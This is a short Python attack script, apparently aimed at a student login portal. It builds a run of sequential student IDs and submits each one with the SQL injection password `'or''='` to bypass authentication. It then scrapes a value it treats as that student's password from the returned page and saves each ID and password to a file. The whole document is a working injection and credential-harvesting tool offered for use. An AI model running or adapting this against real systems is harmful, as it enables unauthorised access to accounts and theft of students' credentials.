import requests, pprint, json, time
from bs4 import BeautifulSoup

def main():

    url = "" # url target

    with requests.session() as session:

        id = '' # set id fac
        std_id = []

        for i in range(1,17):

            data = f'{id}{str(i):>02}'
            std_id.append(data)

        for sid in std_id:
           
            # set payloads     
            data = {
                'idno' : sid,
                'idpass' : "'or''='",
                'page': 1,
                'Submit' : '++%E0%B9%80%E0%B8%82%E0%B9%89%E0%B8%B2%E0%B8%AA%E0%B8%B9%E0%B9%88%E0%B8%A3%E0%B8%B0%E0%B8%9A%E0%B8%9A++'
            }
            
            response = session.post(url,data=data)

            soup = BeautifulSoup(response.text,'html.parser')
            find_tag = soup.find_all("img")[1]

            str_data = str(find_tag).split(" ")
            std_pass = str_data[3][35:-5:]

            with open("data.txt","a") as f:
                f.write(f'{std_id}:{std_pass}\n')
                print("[*] Success!!")

            time.sleep(20)

if __name__ == '__main__':
    main()